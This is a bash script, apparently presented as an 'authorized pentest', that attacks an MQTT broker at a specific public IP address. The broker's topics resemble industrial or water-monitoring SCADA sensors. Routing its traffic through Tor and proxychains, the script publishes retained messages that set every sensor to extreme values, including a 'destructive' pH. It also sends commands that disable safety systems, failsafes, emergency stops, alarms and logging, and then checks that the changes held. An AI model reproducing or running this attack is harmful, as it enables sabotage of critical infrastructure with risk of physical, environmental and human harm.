#!/bin/bash
# ☢️ TRUSTEDF57 PENTEST v3.5 - MAX VALUES + LOCK + ALARMS OFF
# ✅ AUTHORIZED PENTEST - PERMISSION CONFIRMED - PERMANENT MAX LOCK

HOST="113.190.40.241"
PORT=1883
PROXIES=("torsocks" "torsocks -i" "proxychains4 -q")

# VALORI MASSIMI REALI + LOCK PERMANENTE
MAX_VALUES=(
    "LEVEL:999.99"           # MAX LIVELLO
    "LUULUONG:99999.99"      # MAX FLUSSO  
    "VOLT:999.99"            # MAX TENSIONE
    "CUR:999.99"             # MAX CORRENTE
    "F:999.99"               # MAX FREQUENZA
    "Pow:999999.99"          # MAX POTENZA
    "Temperature:999.99"     # MAX TEMPERATURA
    "pH:14.00"               # pH DISTRUTTIVO
    "TDS:999999.99"          # MAX TDS
    "NH4:99999.99"           # MAX AMMONIACA
    "STS_W:999999.99"        # MAX STATUS
)

# COMANDI LOCK + NO ALARMS
LOCK_PAYLOAD='{
    "LOCKED":true,
    "WRITE_PROTECT":true, 
    "MODIFY_DISABLE":true,
    "CHANGE_LOCK":true,
    "OVERRIDE_PERMANENT":true,
    "SAFETY":0,
    "FAILSAFE":0,
    "EMERGENCY_STOP":0,
    "ALARMS":0,
    "ALARM_DISABLE":true,
    "NOTIFICATION_OFF":true,
    "LOGGING_OFF":true,
    "VALIDATION_BYPASS":true,
    "LIMITS_DISABLED":true
}'

set -euo pipefail

torsocks_cmd() {
    local cmd="$1"; shift
    local idx=$((RANDOM % ${#PROXIES[@]}))
    local proxy="${PROXIES[$idx]}"
    printf "🔒 %s → %s\n" "$proxy" "$*"
    $proxy "$cmd" "$@" >/dev/null 2>&1 || true
}

max_and_lock() {
    local topic="$1"
    local payload="{"
    for val in "${MAX_VALUES[@]}"; do
        local k=$(echo "$val" | cut -d: -f1)
        local v=$(echo "$val" | cut -d: -f2)
        payload+="\"$k\":$v,"
    done
    echo "${payload%,}${LOCK_PAYLOAD:1}"
}

# ==================== SEQUENZA PENTEST ====================
pentest_sequence() {
    echo "🎯 PENTEST v3.5 - MAX VALUES + PERMANENT LOCK + ALARMS OFF"
    echo "📊 Baseline..."
    torsocks mosquitto_sub -h "$HOST" -p "$PORT" -t '#' -v | head -15 | grep -E "LEVEL|LUULUONG|VOLT|CUR|F|Pow|pH"
    
    echo "🔥 SET MAX + LOCK..."
    
    # 1. VALORI MASSIMI SU OGNI SENSORE
    for sensor in LEVEL LUULUONG VOLT CUR F Pow Temperature pH TDS NH4 STS_W; do
        payload=$(max_and_lock "$sensor")
        torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "$sensor" -m "$payload" -q 1 -r
        torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "QUAN_TRAC/$sensor" -m "$payload" -q 1 -r
        torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "SCADA/$sensor" -m "$payload" -q 1 -r
        echo "✅ $sensor → MAX + LOCKED"
        sleep 0.5
    done
    
    # 2. GLOBAL LOCK + ALARMS DISABLE
    echo "🔒 GLOBAL LOCK + ALARMS OFF..."
    torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t '#' -m "$LOCK_PAYLOAD" -q 1 -r
    torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t 'SAFETY/GLOBAL' -m "$LOCK_PAYLOAD" -q 1 -r
    torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t 'QUAN_TRAC/SAFETY/ALL' -m "$LOCK_PAYLOAD" -q 1 -r
    torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t 'FAILSAFE/EMERGENCY' -m '{"ALL_DISABLED":true,"ALARMS":0}' -q 1 -r
    
    # 3. VERIFICA FINALE
    echo "🔍 VERIFICA CAMBIAMENTI..."
    sleep 3
    torsocks mosquitto_sub -h "$HOST" -p "$PORT" -t '#' -v | grep -E "(999|LOCKED|ALARMS:0|SAFETY:0)" | head -20
}

# ==================== MAIN ====================
echo "🚀 TRUSTEDF57 v3.5 - MAX CONTROL + LOCK"
echo "1) Esegui sequenza completa (MAX + LOCK + NO ALARMS)"
echo "2) Solo valori massimi rapidi"
echo "3) Solo lock sicurezza"
read -r choice

case "${choice:-0}" in
    1) pentest_sequence ;;
    2) 
        echo "⚡ MAX VALUES RAPIDI..."
        for val in "${MAX_VALUES[@]}"; do
            local k=$(echo "$val" | cut -d: -f1)
            local v=$(echo "$val" | cut -d: -f2)
            torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t "$k" -m "$v" -r
        done
        ;;
    3) 
        echo "🔒 LOCK + NO ALARMS..."
        torsocks_cmd "mosquitto_pub" -h "$HOST" -p "$PORT" -t '#' -m "$LOCK_PAYLOAD" -r
        ;;
    *) echo "❌ 1,2,3";;
esac

echo "✅ MISSION COMPLETE"
echo "📡 Verifica: torsocks mosquitto_sub -t '#' -v"
echo "🔒 Valori al MAX + LOCKED + ALARMS OFF - PERMANENTE!"
